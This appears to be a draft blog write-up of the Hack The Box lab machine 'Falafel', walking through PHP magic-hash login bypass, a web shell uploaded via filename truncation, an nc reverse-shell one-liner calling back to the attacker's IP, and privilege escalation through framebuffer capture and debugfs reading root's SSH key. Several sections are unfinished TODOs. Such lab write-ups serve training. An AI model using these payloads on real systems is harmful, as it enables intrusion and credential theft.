---
layout: post
title:  "Hack The Box - Falafel - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSWE"]
---
{% assign imgDir="HTB-Falafel-Writeup" %}

# Introduction
The hack the box machine "Falafel" is a hard machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of arbitrary file uploads, PHP comparisions

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that 

![nmap](/assets/{{ imgDir }}/nmap.png)

If we navigate to the web server, we are met with the page below. It doesn't contain much except or a link to a login page and a link "Home" leading to the page we are already on. The login page has the extension `.php` meaning that we are dealing with a php application.

![indexPHP](/assets/{{ imgDir }}/indexPHP.png)

![loginPHP](/assets/{{ imgDir }}/loginPHP.png)

We can use ffuf to guess directory and file names, as shown below. We specify the target host with the `-u` flag, specify file extensions with the `-e` flag, choose a wordlist using the `-w` flag and set the `-ic` flag to instruct the tool to ignore comments in the wordlist file.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@ffuf -u http://10.10.10.73/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt@@

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.73/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

login.php               [Status: 200, Size: 7063, Words: 878, Lines: 103]
profile.php             [Status: 302, Size: 9787, Words: 1292, Lines: 259]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 288, Words: 10, Lines: 18]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 7203, Words: 774, Lines: 110]
footer.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
@@@upload.php@@@              [Status: @@@302@@@, Size: 0, Words: 1, Lines: 1]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
style.php               [Status: 200, Size: 6174, Words: 690, Lines: 69]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 30, Words: 3, Lines: 2]
@@@cyberlaw.txt@@@            [Status: @@@200@@@, Size: @@@804@@@, Words: 106, Lines: 18]
connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1]
.php                    [Status: 403, Size: 290, Words: 22, Lines: 12]
                        [Status: 200, Size: 7203, Words: 774, Lines: 110]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
:: Progress: [661641/661641] :: Job [1/1] :: 691 req/sec :: Duration: [0:15:57] :: Errors: 0 ::
{% endhighlight %}
cyberlaw.txt

Visiting all the 302 results in login page
style.php - Contains styling for the website. Probably, this file is included in other php files to style every page of the website. header.php and footer.php contains the header of the website and is also included in all php files

Visiting robots.txt provides no interesting information about any hidden directories or files.
We are also not interested in any 200 OK with 0 bytes (connction.php).

403 is forbidden => not interesting

In conclusion, there are two files left that are interesting to us. The first is cyberlaw.txt since it resulted in a 200 ok and contains data. The second is upload.php since the name suggests that it allows users to upload files, meaning that we could potentially use this page to obtain RCE. However, we would first need to have access to a valid account to access this functionality.

Navigating to [10.10.10.73/cyberlaw.txt](10.10.10.73/cyberlaw.txt) results in the page below. This page contains an email stating that there is a known problem with the authentication of the website and that there is an issue with a file upload feature which might lead to remote code execution on the target. In addition, it informs us that `admin` and `chris` might be valid usernames.

![cyberLawTXT](/assets/{{ imgDir }}/cyberLawTXT.png)

TODO: Background on php type juggling.

Trying to login with "admin" and "240610708" results in a successful login! We can strongly suspect that the authentication check looks something like md5(password) == "0e..."

<div style="overflow-x:auto;">
<table class="customTable"><tr><th>Hash Type</th><th>Hash Length</th><th>Input</th><th>Magic Hash</th></tr>
<tr><td>MD2</td><td>32</td><td>505144726</td><td>0e015339760548602306096794382326</td></tr>
<tr><td>MD4</td><td>32</td><td>48291204</td><td>0e266546927425668450445617970135</td></tr>
<tr><td>MD5</td><td>32</td><td>240610708</td><td>0e462097431906509019562988736854</td></tr>
<tr><td>SHA-1</td><td>40</td><td>10932435112</td><td>0e07766915004133176347055865026311692244</td></tr>
</table>
</div>

We have the usernames chris and admin. We can try to log in with each password in the Input field of the table for each account. Upon doing this, it is possible to notice that we can log in with the username admin and password "240610708".

![adminLogin](/assets/{{ imgDir }}/adminLogin.png)

What has happened is probably that the authentication portion of the code has an if clause like `passwordHash == md5(receivedPassword)` where passwordHash is the stored password hash for the admin user and receivedPassword is the password we provided. If `passwordHash` can be casted to a float with a numeric value of `0`, we will pass the check since we know that `md5(receivedPassword)` becomes `0e462097431906509019562988736854` and loose comparision is used. For example, if we assume that `passwordHash` is `0e12345678123456781234567812345678`, the comparision would result in `true`, as can be seen below.

{% highlight none linenos %}
kali@kali:/tmp/x$ @@php -a@@
Interactive mode enabled

php > @@var_dump("0e12345678123456781234567812345678"=="0e462097431906509019562988736854");@@
bool(@@@true@@@)
php > 
{% endhighlight %}

![loginSuccess](/assets/{{ imgDir }}/loginSuccess.png)

We can start a python server by executing `python3 -m http.server 80
` and try to upload files

{% highlight none linenos %}
<?php $cmd = system($_REQUEST["cmd"]); ?>
{% endhighlight %}

{% highlight none linenos %}
kali@kali:/tmp/x$ echo '<?php $cmd = system($_REQUEST["cmd"]); ?>' > webShell.php
kali@kali:/tmp/x$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
{% endhighlight %}


http://10.10.16.7/webShell.php

![badExtension](/assets/{{ imgDir }}/badExtension.png)
mv webShell.php webShell.php.png

![uploadPNG](/assets/{{ imgDir }}/uploadPNG.png)

However, if we rename the file to 250 `A` characters followed by `.png` and try to reupload it, we can see that the upload is successful but that the filename was truncated since it was too long.

mv webShell.php.png AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png

![tooLong](/assets/{{ imgDir }}/tooLong.png)
The new filename is not shown since it is too long to be rendered properly. However, we can see it by inspecting the source of the page or by inspecting the response in a proxy tool such as BrupSuite, as shown below. 

![tooLongName](/assets/{{ imgDir }}/tooLongName.png)

By counting the number of characters in the new file name, we can conclude that the length limit is 236 characters and that any filename longer than that will be truncated at this limit. As such, we can try to upload a file with a name that consists of 232 `A` characters followed by `.php.png`. This should pass the extension filter but save the file with the extension `.php`.

filename length limitation of 236 characters. If we look closely at the output, we can see that the last part of the filename is being truncated. This 


We know that hte web root is /var/www/html
We can see that the file was uploaded to x and should have the name AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php

![uploadWS](/assets/{{ imgDir }}/uploadWS.png)

[http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd](http://10.10.10.73/uploads/0318-1557_d779068805ae58df/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=pwd)

![RCE](/assets/{{ imgDir }}/RCE.png)

We can use the reverse shell payload below to acquire a shell.
{% highlight none linenos %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.7 443 >/tmp/f
{% endhighlight %}

![urlEncode](/assets/{{ imgDir }}/urlEncode.png)
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%37%20%34%34%33%20%3e%2f%74%6d%70%2f%66

We url-encode it, execute `nc -lvp 443` to start a netcat listener and execute it using the web shell. Once the server has processed the request, the server connects back to our listener and provides us with a shell, as can be seen below.

![shell](/assets/{{ imgDir }}/shell.png)


# Privilege Escalation

<!-- ffmpeg -vcodec rawvideo -f rawvideo -pix_fmt rgb565 -s 1176x885 -i fb0.raw -f image2 -vcodec mjpeg -frames:v 1 out-buffer.jpg -->

{% highlight none linenos %}
$ @@ls ../..@@
assets
authorized.php
@@@connection.php@@@
css
cyberlaw.txt
footer.php
header.php
icon.png
images
index.php
js
login.php
login_logic.php
logout.php
profile.php
robots.txt
style.php
upload.php
uploads
$ @@cat ../../connection.php@@
<?php
   define('DB_SERVER', 'localhost:3306');
   define('@@@DB_USERNAME@@@', '@@@moshe@@@');
   define('@@@DB_PASSWORD@@@', '@@@falafelIsReallyTasty@@@');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
$ 
{% endhighlight %}

{% highlight none linenos %}
kali@kali:~$ @@ssh moshe@10.10.10.73@@
moshe@10.10.10.73's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Feb  5 23:35:10 2018 from 10.10.14.2
$ @@groups@@
moshe adm mail news voice floppy audio @@@video@@@ games
{% endhighlight %}

If we execute `w`, we see that the `yossi` user is currently physically active on the target host. We

{% highlight none linenos %}
$ @@w@@
 19:56:03 up 13 min,  2 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@@yossi@@@    tty1                      19:42   13:38   0.07s  0.06s -bash
moshe    pts/0    10.10.16.3       19:56    2.00s  0.00s  0.00s w
$ @@ls -l /dev/fb*@@
crw-rw---- 1 root @@@video@@@ 29, 0 May  1 19:42 @@@/dev/fb0@@@
$ @@cat /dev/fb0 > /tmp/screenshot.raw@@
$ @@cat /sys/class/graphics/fb0/virtual_size@@
@@@1176,885@@@
$
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@scp moshe@10.10.10.73:/tmp/screenshot.raw ./screenshot.raw@@
moshe@10.10.10.73's password: 
@@@screenshot.raw                                                                    100%@@@ 4065KB   2.4MB/s   00:01    
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}

TODO: Background of frame buffer
It is a [character device] which makes it easy for software to interact with the video hardware.

We can use ffmpeg to convert the captured image from the frame buffer. We do this by executing `ffmpeg -pix_fmt [pixelFormat] -s 1176x885 -f rawvideo -i fb0.raw -f singlejpeg screenshot.jpg` where [pixelFormat] is the pixel format we want. TODO: Explain flags

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ffmpeg -pix_fmts@@                                                                       
[...]
Pixel formats:
I.... = Supported Input  format for conversion
.O... = Supported Output format for conversion
..H.. = Hardware accelerated format
...P. = Paletted format
....B = Bitstream format
FLAGS NAME            NB_COMPONENTS BITS_PER_PIXEL
-----
IO... yuv420p                3            12
IO... yuyv422                3            16
IO... rgb24                  3            24
IO... bgr24                  3            24
IO... yuv422p                3            16
IO... yuv444p                3            24
IO... yuv410p                3             9
IO... yuv411p                3            12
IO... gray                   1             8
IO..B monow                  1             1
IO..B monob                  1             1
I..P. pal8                   1             8
IO... yuvj420p               3            12
IO... yuvj422p               3            16
IO... yuvj444p               3            24
IO... uyvy422                3            16
..... uyyvyy411              3            12
IO... bgr8                   3             8
.O..B bgr4                   3             4
IO... bgr4_byte              3             4
IO... rgb8                   3             8
.O..B rgb4                   3             4
IO... rgb4_byte              3             4
IO... nv12                   3            12
IO... nv21                   3            12
IO... argb                   4            32
IO... rgba                   4            32
[...]
{% endhighlight %}

This results in a set of images which are shown in the video below. 

<video width="100%" controls="controls">
  <source src="/assets/{{ imgDir }}/pixelFormats.mp4" type="video/mp4">
</video>


We use the -f flag twice. Once for the input file and once for the output file

It is also possible to this with gimp or with custom code.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -f singlejpeg screenshot.jpg@@
ffmpeg version 4.4.1-3+b2 Copyright (c) 2000-2021 the FFmpeg developers
  built with gcc 11 (Debian 11.2.0-18)
  configuration: --prefix=/usr --extra-version=3+b2 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libdav1d --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librabbitmq --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libsrt --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opencl --enable-opengl --enable-sdl2 --enable-pocketsphinx --enable-librsvg --enable-libmfx --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared
  libavutil      56. 70.100 / 56. 70.100
  libavcodec     58.134.100 / 58.134.100
  libavformat    58. 76.100 / 58. 76.100
  libavdevice    58. 13.100 / 58. 13.100
  libavfilter     7.110.100 /  7.110.100
  libswscale      5.  9.100 /  5.  9.100
  libswresample   3.  9.100 /  3.  9.100
  libpostproc    55.  9.100 / 55.  9.100
[rawvideo @ 0x56212015f700] Estimating duration from bitrate, this may be inaccurate
Input #0, rawvideo, from 'screenshot.raw':
  Duration: 00:00:00.04, start: 0.000000, bitrate: 832608 kb/s
  Stream #0:0: Video: rawvideo ([0]RGB / 0x42475200), 0rgb, 1176x885, 832608 kb/s, 25 tbr, 25 tbn, 25 tbc
Stream mapping:
  @@@Stream #0@@@:0 -> #0:0 (@@@rawvideo@@@ (native) -> @@@mjpeg@@@ (native))
Press [q] to stop, [?] for help
[swscaler @ 0x562120178740] deprecated pixel format used, make sure you did set range correctly
@@@Output #0, singlejpeg, to 'screenshot.jpg'@@@:
  Metadata:
    encoder         : Lavf58.76.100
  Stream #0:0: Video: mjpeg, yuvj444p(pc, progressive), 1176x885, q=2-31, 200 kb/s, 25 fps, 25 tbn
    Metadata:
      encoder         : Lavc58.134.100 mjpeg
    Side data:
      cpb: bitrate max/min/avg: 0/0/200000 buffer size: 0 vbv_delay: N/A
frame=    1 fps=0.0 q=5.7 Lsize=      46kB time=00:00:00.04 bitrate=9339.0kbits/s speed= 1.7x    
video:46kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.000000%
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@xdg-open screenshot.jpg@@
{% endhighlight %}

Internally, we see that the tool converts the frame buffer data to a mjpeg format. Then, it uses this data to create a single jpg file.

![screenshot](/assets/{{ imgDir }}/screenshot.png)

We see that the yossi user attempted to change password to `MoshePlzStopHackingMe!`

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@ssh yossi@10.10.10.73@@
yossi@10.10.10.73's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sun May  1 19:42:33 2022
yossi@falafel:~$ @@groups@@
yossi adm @@@disk@@@ cdrom dip plugdev lpadmin sambashare
yossi@falafel:~$
{% endhighlight %}

{% highlight none linenos %}
yossi@falafel:~$ @@df@@
Filesystem     1K-blocks    Used Available Use% Mounted on
udev              487824       0    487824   0% /dev
tmpfs             101604    4656     96948   5% /run
@@@/dev/sda1@@@        7092728 2354532   4354864  36% /
tmpfs             508008       0    508008   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs             508008       0    508008   0% /sys/fs/cgroup
tmpfs             101604       0    101604   0% /run/user/1000
yossi@falafel:~$ @@debugfs /dev/sda1@@
debugfs 1.42.13 (17-May-2015)
debugfs:  @@ls -l /root/.ssh@@
 402797   40755 (2)      0      0    4096 15-Jan-2018 02:12 .
 262241   40750 (2)      0      0    4096  5-Feb-2018 17:04 ..
 402812  100600 (1)      0      0    1679 28-Nov-2017 23:01 @@@id_rsa@@@
 402822  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
 402824  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys
debugfs:  @@dump /root/.ssh/id_rsa /tmp/id_rsa@@
debugfs:  @@quit@@
yossi@falafel:~$
{% endhighlight %}

{% highlight none linenos %}
yossi@falafel:~$ @@cd /tmp@@
yossi@falafel:/tmp$ @@ls -l@@
total 4084
@@@-rw-------@@@ 1 @@@yossi@@@ @@@yossi@@@    1679 May  1 21:07 @@@id_rsa@@@
-rw-rw-r-- 1 moshe moshe 4163040 May  1 19:43 screenshot.raw
drwx------ 3 root  root     4096 May  1 19:42 systemd-private-d40e650d496c4e869d429f14c8dec8aa-systemd-timesyncd.service-vyIRsF                                                                                                         
drwx------ 2 root  root     4096 May  1 19:42 vmware-root
drwxrwxr-x 2 yossi yossi    4096 May  1 20:34 x
yossi@falafel:/tmp$ @@chmod 600 id_rsa@@
yossi@falafel:/tmp$ @@ssh -i ./id_rsa root@localhost@@
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:XPYifpo9zwt53hU1RwUWqFvOB3TlCtyA1PfM9frNWSw.
Are you sure you want to continue connecting (yes/no)? @@yes@@
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
@@@root@@@@falafel:~# 
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}